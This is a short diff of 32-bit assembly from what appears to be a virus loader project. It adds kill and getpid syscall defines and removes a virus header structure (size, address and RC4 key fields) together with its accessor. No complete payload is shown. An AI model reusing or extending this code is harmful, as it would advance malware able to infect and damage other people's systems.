@@ -1,7 +1,8 @@
 BITS 32
+%define __NR_KILL	0X25
+%define __NR_GETPID	0X14
 
 global loader
-global _GET_HEADER_VIRUSE:
 
 ;; -- rc4(char *key, char *value, size_t len_key, size_t len_code ) -- ;;
 
@@ -466,15 +467,3 @@ loader:
 	NOP
 	NOP
 	NOP
-
-_GET_HEADER_VIRUSE:
-	LEA EAX, [REL VIRUS_HEADER_STRUCT]
-	RET
-
-
-VIRUS_HEADER_STRUCT:
-	db 0x00, 0x00, 0x00, 0x00,                                                                        ;; -- SIZE -- ;;
-	db 0xFE, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF 		                                  ;; -- ADDRESS -- ;;
-	db 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00 ;; -- KEY -- ;;
-
-_START:	
